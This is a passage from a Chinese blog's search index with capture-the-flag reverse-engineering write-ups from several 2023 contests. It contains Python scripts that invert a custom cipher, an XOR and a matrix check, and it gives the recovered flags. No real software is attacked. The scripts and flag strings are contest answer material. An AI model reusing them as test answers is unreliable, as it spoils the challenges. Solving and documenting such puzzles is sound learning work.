keylist2 = [212,253,128,196,80,16,222,109,232,240,12,82,9,64,36,151,222,119,20,95,105,246,192,116,142,109,128,206,204,7,192,244,160,4,240,28,198,0,162,88,244,52,64,176,76,160,168,86,89,233,56,40,208,104,64,102,150,69,210,103,64,208,36,0,19,76,202,120,76,188,192,66,0,16,109,192,0,56,176,4,196,72,128,232,113,255,64,132,70,84,37,122,56,32,248,192,56,148,249,112,228,250,112,8,64,51,231,104,176,214,32,251,129,76,46,138,27,58,146,120,232,36,34,39,92,210,20,138,176,96,100,32,16,229,209,92,233,121,82,52,103,128,76,226,32,160,84,223,40,48,240,134,173,197,133,113,192,78,186,204,152,35,86,18,144,201,91,84,84,72,186,172,44,220,34,144,232,24,140,129,68,49,132,128,232,138,224,140,186,250,188,230,240,158,102,218,84,161,200,30,144,240,147,57,80,24,153,149,72,129,160,74,176,106,128,123,176,200,157,57,251,126,116,64,128,42,144,96,74,226,218,0,14,192,224,190,6,197,97,212,156,51,136,64,112,120,242,124,172,176,248,203,204,62,234,100,160,190,172,10,212,48,88,77,116,72,144,24,234,16,192,0,5,160,78,221,236,168,16,224,32,66,9,100,64,148,147,144,97,2,58,57,223,154,60,41,111,231,16,179,75,211,157,178,91,7,132,240,59,190,206,182,188,10,72,184,99,72,250,104,116,228,248,172,22,151,142,42,233,76,44,235,104,130,184,36,146,6,185,162,240,144,234,170,228,10,123,64,92,252,190,84,144,129,68,244,55,160,147,101,32,22,130,205,174,36,0,41,160,139,68,251,228,88,213,192,156,132,13,141,207,80,40,8,140,190,108,188,24,8,9,89,173,204,248,28,120,40,189,90,49,222,0,108,97,139,35,176,133,141,20,63,152,104,3,172,192,115,150,32,58,194,108,64,49,112,152,46,144,22,186,254,195,129,152,119,196,187,115,248,58,17,112,17,124,29,152,132,12,31,90,77,179,192,49,176,33,76,156,32,230,108,137,192,121,191,53,168,102,137,200,34,118,192,138,193,112,216,45,217,182,128,56,140,128,208,46,35,64,171,123,199,221,52,75,244,192,63,178,205,97,145,48,216,188,228,203,72,165,204,130,178,24,243,30,150,113,89,30,156,104,59,232,65,168,8,117,208,132,248,214,12,221,64,107,51,164,124,32,150,79,47,184,18,200,22,64,232,160,45,112,16,189,96,76,220,57,171,89,97,113,208,192,235,240,254,170,212,92,252,147,248,249,68,97,64,24,230,134,126,3,80,23,184,171,16,130,66,9,68,224,150,202,212,10,70,156,107,210,146,205,144,64,46,107,16,83,96,167,151,99,218,130,41,198,0,112,172,188,74,64,4,224,116,176,176,128,48,220,112,108,64,126,208,144,157,45,135,184,197,100,13,220,94,96,215,12,219,0,128,33,23,221,184,32,253,143,0,184,24,28,4,255,177,104,196,233,171,132,107,130,128,20,68,200,106,33,250,52,166,249,91,216,94,240,211,239,146,246,243,198,126,227,136,45,229,246,191,144,190,228,48,168,59,140,200,236,54,236,0,176,4,248,184,79,64,194,248,124,209,123,48,180,136,107,160,0,112,89,20,133,215,140,68,41,163,233,192,47,166,228,230,251,185,188,180,54,212,156,208,40,100,4,132,16,53,96,200,26,192,237,19,95,154,240,234,96,219,128,75,239,206,159,112,255,0,35,157,138,164,176,208,98,104,47,128,117,116,13,222,0,96,49,64,195,144,148,134,49,255,34,120,52,32,137,55,49,131,46,177,113,64,9,192,196,78,226,82,94,144,160,38,87,71,78,144,84,188,82,67,202,209,144,32,36,25,140,94,148,168,12,168,196,221,145,71,128,96,56,64,184,101,112,32,145,72,71,0,108,112,166,254,36,68,0,132,188,214,125,60,200,113,46,28,149,147,48,169,138,239,101,184,73,192,32,51,104,112,104,16,176,110,234,8,219,98,192,139,102,62,80,96,121,24,212,105,150,28,63,26,80,108,87,0,4,216,124,97,127,164,4,7,116,80,119,41,160,140,224,92,4,248,224,195,222,44,210,158,241,64,92,80,220,45,0,193,208,208,7,20,108,253,158,110,201,94,48,168,58,33,168,149,88,135,64,117,108,12,104,216,158,230,194,112,121,0,103,41,252,1,242,22,236,250,96,175,96,29,236,184,252,157,72,96,232,172,30,136,151,32,61,128,80,16,198,152,96,235,144,70,18,0,32,96,8,84,236,123,0,2,176,7,240,156,88,200,216,12,9,184,57,104,160,16,182,99,0,56,200,128,223,230,58,220,88,88,148,92,99,96,140,147,193,208,224,68,86,96,200,187,122,126,115,27,171,184,11,140,35,28,240,24,123,15,147,250,102,224,76,0,232,180,49,48,240,130,24,64,254,140,240,252,31,113,140,126,200,128,206,0,0,160,213,35,39,4,0,237,217,144,130,108,125,4,0,192,18,211,24,93,134,224,83,65,159,216,221,11,224,230,239,130,100,119,83,123,91,220,20,132,86,128,32,168,57,80,232,96,88,70,240,242,6,192,230,4,208,190,121,205,168,62,160,30,137,36,56,251,58,88,126,38,164,0,56,152,131,232,100,120,176,213,249,246,22,99,136,161,160,96,245,36,246,224,48,228,164,38,16,191,157,220,244,208,56,205,10,38,41,12,208,120,227,176,154,115,128,67,167,163,156,197,124,41,74,112,40,172,135,241,80,212,17,232,50,184,180,76,21,180,124,81,41,172,144,158,18,216,190,191,16,4,132,230,136,220,219,224,0,73,96,196,16,114,146,238,140,22,117,110,126,64,8,148,65,64,96,136,11,0,90,44,46,10,10,78,48,42,136,78,17,35,190,112,128,237,80,185,187,56,80,28,108,35,32,202,162,230,112,248,147,69,128,101,95,123,204,160,220,48,238,86,134,175,16,253,121,221,236,145,24,176,44,168,192,56,241,31,128,21,98,41,96,234,144,151,134,97,226,124,67,213,14,168,0,228,140,16,198,16,52,68,216,242,24,192,217,92,172,182,229,13,15,221,148,136,167,88,254,226,213,176,104,138,20,152,10,70,22,230,96,63,200,72,164,58,61,210,24,214,63,255,36,77,138,0,172,96,246,182,232,0,248,204,248,0,116,14,252,192,248,139,200,85,93,28,32,75,248,16,128,176,0,78,156,137,152,218,48,18,76,205,218,171,63,80,40,224,0,6,240,87,128,15,233,52,68,49,248,134,193,47,0,128,30,194,96,167,182,224,112,202,161,206,79,187,176,198,212,44,198,139,0,176,16,186,141,139,24,12,253,89,195,160,175,23,130,97,254,128,96,235,192,70,144,66,64,238,72,188,64,216,88,96,80,151,68,210,224,161,77,22,80,132,240,84,21,9,173,12,128,128,68,112,224,81,202,52,134,136,18,20,199,32,244,243,107,108,16,220,84,72,236,125,148,184,64,185,49,88,156,240,221,168,80,87,24,208,108,254,32,107,185,23,130,78,217,104,0,147,60,82,160,226,187,64,36,232,196,85,182,39,202,63,118,88,192,169,0,70,8,32,166,144,139,86,52,17,157,29,160,224,24,126,147,148,189,156,250,11,189,110,68,43,179,148,253,167,168,240,100,190,140,250,221,92,14,143,128,92,168,18,119,112,153,220,74,118,8,46,84,96,186,224,173,199,153,154,0,8,0,184,98,148,65,128,154,196,38,237,191,144,245,116,91,45,73,87,192,68,208,159,242,94,96,179,64,134,104,106,32,48,22,208,188,96,7,144,136,49,185,125,139,16,249,112,66,41,98,232,55,80,197,144,40,167,132,70,52,104,64,107,228,64,25,32,144,38,148,174,196,225,50,126,175,253,96,16,100,196,152,8,192,233,219,52,11,112,150,100,4,226,50,186,153,48,232,170,30,142,189,211,142,48,55,125,52,73,248,0,59,94,211,124,200,133,179,243,64,112,128,64,211,197,144,168,162,183,128,0,204,185,40,198,133,190,12,152,250,180,121,118,239,176,128,203,129,0,72,127,240,200,144,78,124,240,107,84,89,214,75,228,121,81,32,0,192,246,169,212,212,224,254,239,28,178,212,114,128,194,234,246,223,240,118,239,120,212,152,215,114,77,235,64,71,24,168,113,82,87,160,119,197,134,0,176,10,45,168,144,219,232,235,247,8,68,146,100,97,250,102,34,220,248,0,93,26,214,181,24,0,248,127,216,104,7,156,220,160,249,14,136,37,176,144,96,241,41,136,207,132,62,32,152,40,58,80,135,51,45,176,132,132,208,164,64,0,120,170,250,32,218,197,45,15,56,32,56,3,220,67,98,113,11,175,32,107,0,228,88,235,198,184,160,160,112,16,118,70,160,180,216,226,120,71,14,79,200,212,48,228,132,76,176,145,194,160,254,112,239,16,64,104,131,210,180,32,205,208,0,254,179,51,55,128,151,215,160,199,98,190,64,255,208,192,68,148,218,50,176,156,216,90,52,114,14,21,12,128,208,194,26,207,250,178,32,72,200,94,93,98,187,38,164,107,115,0,8,242,143,187,19,182,64,11,241,233,241,249,128,248,76,202,61,96,231,154,62,13,119,131,150,96,160,196,129,196,246,32,121,48,64,66,149,228,11,74,48,64,170,115,145,188,167,232,237,32,78,188,109,188,245,34,174,107,121,56,129,92,136,89,188,80,84,107,132,97,184,32,193,236,8,195,156,58,50,7,208,251,209,211,171,191,28,192,147,154,226,144,40,160,224,232,240,209,160,204,224,168,90,160,97,26,174,46,177,25,38,94,0,244,94,156,221,179,208,142,128,94,111,34,40,96,62,232,155,151,20,14,202,80,12,0,15,64,36,255,240,235,14,250,124,116,27,108,33,183,215,176,27,48,130,187,250,92,3,176,200,160,85,225,224,177,131,52,192,186,80,219,68,141,214,177,138,190,231,119,2,136,152,221,0,225,11,16,24,79,1,194,16,112,128,179,42,198,64,79,249,114,14,33,224,122,44,212,188,60,240,242,202,0,114,20,240,186,127,112,152,128,141,167,65,84,63,77,191,198,0,192,16,48,117,214,0,192,50,40,228,63,165,148,88,200,212,182,4,133,56,138,73,28,38,161,236,200,134,25,0,88,112,209,194,36,109,55,46,192,128,28,32,213,17,17,68,152,153,64,128,21,26,222,152,0,0,124,107,0,237,68,195,202,216,232,128,22,196,176,217,184,228,93,239,211,76,96,203,221,80,145,178,64,23,108,220,32,7,220,110,255,248,157,96,47,192,148,60,154,192,144,26,109,112,136,128,174,0,200,1,192,211,165,200,164,182,152,224,128,76,38,240,96,81,60,85,120,54,90,158,241,88,213,9,210,166,183,124,121,138,80,19,149,179,158,50,56,221,189,228,220,143,160,46,64,200,52,154,255,224,73,144,114,217,164,200,170,124,65,32,64,0,76,15,192,238,124,97,188,208,0,148,66,120,197,152,185,31,104,155,145,215,4,8,190,102,0,232,252,112,64,156,62,192,10,60,53,88,183,255,45,96,154,136,190,111,212,16,155,160,122,238,166,86,106,7,85,0,135,212,197,60,239,208,252,214,48,0,246,0,109,114,24,135,216,170,152,150,149,72,177,121,240,158,32,215,64,112,80,228,84,124,204,206,16,22,162,253,54,134,80,154,224,156,164,90,98,206,177,119,234,69,64,83,170,134,240,11,4,178,59,80,16,248,98,208,182,172,112,128,102,216,16,40,56,137,5,249,105,152,91,224,104,242,245,167,171,144,168,203,64,168,184,208,141,40,83,156,82,204,254,192,71,48,255,28,88,230,105,135,192,152,140,192,144,140,249,238,190,16,208,152,32,166,142,232,214,16,50,112,126,66,185,20,108,229,14,200,108,0,1,202,70,116,152,18,199,216,96,156,212,198,248,252,2,96,192,196,16,26,186,172,35,64,223,130,71,125,134,6,208,242,8,3,158,152,112,208,154,14,53,88,177,98,208,63,225,131,11,80,108,60,209,227,72,20,224,130,233,144,62,32,75,122,178,19,36,153,60,92,19,176,73,188,7,185,80,170,244,32,121,136,23,35,85,40,227,179,80,11,243,77,64,192,216,177,22,144,84,83,96,73,248,96,11,169,222,228,0,184,112,148,175,153,4,56,216,30,0,196,156,64,4,75,217,248,112,200,132,52,151,247,234,206,60,192,83,124,250,120,15,147,218,16,72,79,248,44,142,90,224,64,85,76,159,184,143,87,128,97,229,3,135,16,130,194,194,69,198,233,96,0,219,24,168,184,246,234,238,224,52,48,126,20,158,146,156,179,138,240,100,145,144,82,40,184,79,0,76,116,0,160,170,190,48,120,93,76,48,236,210,122,152,204,253,241,56,166,242,120,252,64,128,32,64,212,200,251,208,108,156,120,82,4,11,247,136,17,98,246,40,242,64,144,84,142,175,46,212,185,42,31,176,219,205,52,144,216,69,128,92,240,25,169,194,208,115,185,14,6,15,52,75,212,40,224,10,220,99,42,183,196,240,64,98,23,109,20,203,111,232,77,64,251,2,194,243,112,64,199,105,168,157,213,51,168,28,223,100,152,184,157,224,132,232,14,33,115,135,2,163,6,16,143,84,72,101,32,56,84,182,47,112,160,244,139,39,32,40,7,228,105,62,176,149,112,120,218,34,80,98,7,138,144,1,79,30,120,253,68,28,32,27,100,222,219,3,216,205,52,207,66,240,255,188,162,44,152,125,181,112,110,184,164,36,234,80,128,16,8,95,144,53,178,196,84,56,172,166,104,236,64,228,45,146,182,8,169,224,6,228,176,72,127,208,173,246,188,20,186,89,45,0,232,63,216,47,32,192,100,41,214,101,208,136,6,60,33,164,67,208,240,230,220,0,188,135,120,215,83,212,14,240,56,248,64,252,49,1,98,198,116,119,128,0,72,46,210,13,28,37,220,19,67,0,159,153,61,171,55,124,219,127,42,237,220,250,77,144,238,216,25,222,183,76,137,67,40,176,159,120,78,72,58,152,32,128,208,162,248,64,91,152,192,136,69,188,96,17,248,72,191,228,178,85,207,157,11,244,18,202,0,220,224,252,116,221,142,178,158,64,252,128,126,103,80,46,78,206,29,33,138,152,155,36,32,224,162,100,36,163,162]
count_key = 3200 - 1
keylist = [  0x03, 0x02, 0x03, 0x01, 0x03, 0x02, 0x03, 0x03, 0x03, 0x02,
  0x02, 0x02, 0x02, 0x02, 0x03, 0x03, 0x02, 0x01, 0x03, 0x01,
  0x03, 0x02, 0x01, 0x02, 0x03, 0x02, 0x02, 0x01, 0x01, 0x02,
  0x02, 0x02]
enc1 = &#39;ac2018c9c49436ec3154691ea51de52ca91251c38c13722d11a325a18198411e91ca9e4c&#39;
h = &#39;1234567890abcdef&#39;
flag = []
def ord_(a):
    if(ord(a) &gt;= ord(&#39;0&#39;) and ord(a) &lt;= ord(&#39;9&#39;)):
        return int(a)
    else:
        return ord(a) - ord(&#39;a&#39;) + 10

for i in range(3, -1, -1):
    v66_in = 8 * i
    for j in range(100):
        for k in range(8):
            tmp = enc[v66_in + ((k + 1) % 8)]
            tmp += s_box[((keylist2[count_key] &amp; 0xff) + enc[v66_in + ((k) % 8)]) &amp; 0xff]
            tmp &amp;= 0xff
            tmp = (tmp &lt;&lt; 1) | (tmp &gt;&gt; 7 &amp; 0xff)
            enc[v66_in + ((k + 1) % 8)] = tmp &amp; 0xff
            count_key -= 1
key = 0
tmp = &#39;&#39;
# print(enc)
for i in enc:
    if (i &lt;= 0xf):
        tmp += &#39;0&#39;
    tmp += hex(i)[2:]
enc = tmp
print(enc)

key = 0
for i in range(1, 64, 2):
    key += keylist[i // 2]
    for j in h:
        if (h[((ord(enc1[key]) &amp; 0xff) + 3 * ord_(j)) % 16] == enc[i]):
            flag.append(j)
print(&#39;&#39;.join(flag))

# 9d9b9ff1c62122ba7f5b54385b1f9d64
</code></pre>
<p>完结撒花</p>
<p><img src="/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/W6SXN9HRBTXSE%5DH0JNX%5BLW0.png" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>鹤城2023</title>
    <url>/2023/09/18/%E9%B9%A4%E5%9F%8E2023/</url>
    <content><![CDATA[<h6 id="PREFACE-没啥好说的，队友带飞"><a href="#PREFACE-没啥好说的，队友带飞" class="headerlink" title="PREFACE: 没啥好说的，队友带飞"></a>PREFACE: 没啥好说的，队友带飞</h6><span id="more"></span>

<h4 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h4><p>C#，逻辑简单的，多余的部分只是隐藏回显用</p>
<p><img src="/2023/09/18/%E9%B9%A4%E5%9F%8E2023/image-20230918134205880.png" alt="image-20230918134205880"></p>
<pre><code class="python">enc = [123,148,62,53,24,116,244,126,63,90]
from Crypto.Cipher import DES
import string
import itertools
import base64
charset = string.ascii_letters + string.digits + string.punctuation + &quot;&quot;
for j in enc:
    # charset = string.ascii_letters + string.digits + string.punctuation
    for i in range(255):
        b = i &amp; 7
        b2 = i &gt;&gt; 3 &amp; 255
        a = b &lt;&lt; 5 | b2
        a ^= 18
        if (a == j):
            print(chr(i),end=&quot;&quot;)

# flag&#123;K4a9P37ciB&#125; （这里格式忘了，但是里面是对的）
</code></pre>
<h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><p><img src="/2023/09/18/%E9%B9%A4%E5%9F%8E2023/image-20230918134342093.png" alt="image-20230918134342093"></p>
<p>一个简单的异或</p>
<pre><code class="python">enc = [  0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x12,
  0x13, 0x14, 0x15, 0x21, 0x22, 0x23, 0x24, 0x25, 0x31, 0x32,
  0x33, 0x34, 0x35, 0x41, 0x42, 0x43, 0x44, 0x45, 0x51, 0x52,
  0x53, 0x54, 0x55, 0x12, 0x13, 0x11, 0x14, 0x15]

h = [    0x68, 0x27, 0x21, 0x21, 0x70, 0x64, 0x61, 0x32, 0x64, 0x34,
  0x7D, 0x72, 0x73, 0x73, 0x73, 0x51, 0x51, 0x0A, 0x05, 0x07,
  0x40, 0x46, 0x46, 0x46, 0x19, 0x77, 0x25, 0x25, 0x74, 0xFA,
  0xEB, 0x16, 0x53, 0x2E, 0x23, 0x52, 0x4E, 0x77, 0xCD]

flag = &#39;&#39;
for i in range(38):
  flag += chr(enc[len(enc) - 1 - i] ^ h[i])
print(flag[::-1])

# flag&#123;5accf61b8debe679ed21068e6a51b203&#125;
</code></pre>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽2023半决</title>
    <url>/2023/09/19/%E8%93%9D%E5%B8%BD2023%E5%8D%8A%E5%86%B3/</url>
    <content><![CDATA[<h6 id="PREFACE-赛中总觉得是该用z3写，或者angr跑，但是死活出不来，结果发现就是一个矩阵乘法"><a href="#PREFACE-赛中总觉得是该用z3写，或者angr跑，但是死活出不来，结果发现就是一个矩阵乘法" class="headerlink" title="PREFACE: 赛中总觉得是该用z3写，或者angr跑，但是死活出不来，结果发现就是一个矩阵乘法"></a>PREFACE: 赛中总觉得是该用z3写，或者angr跑，但是死活出不来，结果发现就是一个矩阵乘法</h6><span id="more"></span>

<p>先给个程序流程，比较简单的</p>
<p><img src="/2023/09/19/%E8%93%9D%E5%B8%BD2023%E5%8D%8A%E5%86%B3/image-20230919191052104.png" alt="image-20230919191052104"></p>
<p><img src="/2023/09/19/%E8%93%9D%E5%B8%BD2023%E5%8D%8A%E5%86%B3/image-20230919191107056.png" alt="image-20230919191107056"></p>
<p>就没了，就结束了…</p>
<p>exp</p>
<pre><code class="python">import numpy as np
A = [0xfe, 0xb, 0x1d, 0xf6, 0x83, 0xff, 0xe0, 0xb8, 0xdd, 0xb0, 0xc5, 0xde, 0xf6, 0x14, 0x9f, 0xdd, 0xd9, 0x7, 0x2d, 0x6b, 0x19, 0xca, 0x73, 0xfd, 0x87, 0x72, 0x24, 0x4, 0x49, 0x7e, 0xa9, 0xce, 0x91, 0xbe, 0x41, 0x18, 0x60, 0x3f, 0x2b, 0x63, 0x1c, 0xd2, 0x90, 0xe9, 0x8e, 0xba, 0x1e, 0xf3, 0x41, 0xad,
     0x2c, 0x3, 0x69, 0xda, 0x10, 0xfd, 0xfd, 0xe7, 0x6, 0x36, 0xd6, 0x2, 0x59, 0x18, 0xcc, 0x50, 0x87, 0xaf, 0xfb, 0x18, 0x44, 0x7f, 0xad, 0xf8, 0x2c, 0x67, 0x1d, 0x22, 0x84, 0xac, 0xe, 0x23, 0xdc, 0xe6, 0xbb, 0xd2, 0xb8, 0x4a, 0xbc, 0xde, 0x50, 0x9c, 0x1c, 0x1e, 0x86, 0x3a, 0x2d, 0xdd, 0xc3, 0x3]
B = [0x1c633, 0x1df94, 0x20ebf, 0x2ba40, 0x1e884, 0x260d1, 0x1f9b1, 0x1ea1a, 0x1eeaa, 0x1dfb2, 0x1c1d0, 0x1eef2, 0x216e1, 0x2be00, 0x1fb5e, 0x25d74, 0x1f000, 0x202d6, 0x20002, 0x1ddfe, 0x1c017, 0x1f08c, 0x227f6, 0x2c7ba, 0x201ae, 0x27fbf, 0x20e21, 0x1ff5c, 0x1fd62, 0x1e948, 0x1be6e, 0x1f4d7, 0x22c8d, 0x2c353, 0x1f8db, 0x26e1d, 0x1ff61, 0x1ea0f, 0x1f0d6, 0x1eda8, 0x1ad7d, 0x18218, 0x1ccd4, 0x239b6, 0x1ac4c, 0x20d7c, 0x1d967, 0x1a4f4, 0x1cad8, 0x196ae,
     0x1831b, 0x17e45, 0x1d0cf, 0x23edf, 0x181ae, 0x21760, 0x1d3b4, 0x175d6, 0x17d3a, 0x1994f, 0x1189d, 0x14ccf, 0x1568e, 0x17eeb, 0x1327e, 0x16a45, 0x12921, 0x11ff0, 0x13643, 0x11729, 0x15191, 0x17d17, 0x17262, 0x1a863, 0x17010, 0x17b10, 0x14f9c, 0x143e8, 0x15e9b, 0x1242c, 0xf68c, 0x1192a, 0x150ad, 0x1b1a0, 0x14c60, 0x182ab, 0x13f4b, 0x141a6, 0x15aa3, 0x135c9, 0x1d86f, 0x1e8fa, 0x2158d, 0x2bdac, 0x20e4f, 0x27ee6, 0x213b9, 0x20e86, 0x211ff, 0x1e1ef]
A_Mat = []
B_Mat = []
for i in range(0, 100, 10):
    tmp = A[i:i+10]
    A_Mat.append(tmp)
    tmp = B[i:i+10]
    B_Mat.append(tmp)
A_Mat = np.mat(A_Mat)
B_Mat = np.mat(B_Mat)
X_Mat = np.dot(B_Mat, np.linalg.inv(A_Mat))
for i in range(len(X_Mat)):
    tmp = X_Mat[i].tolist()[0]
    for j in range(len(tmp)):
        print(chr(round(tmp[j])), end=&quot;&quot;)

# there_are_a_lot_useless_information_but_oh.o0O_flag&#123;8f9c6cf7-f362-4a4e-ace2-a34d90939589&#125;_you_get_it
</code></pre>
]]></content>
  </entry>
</search>
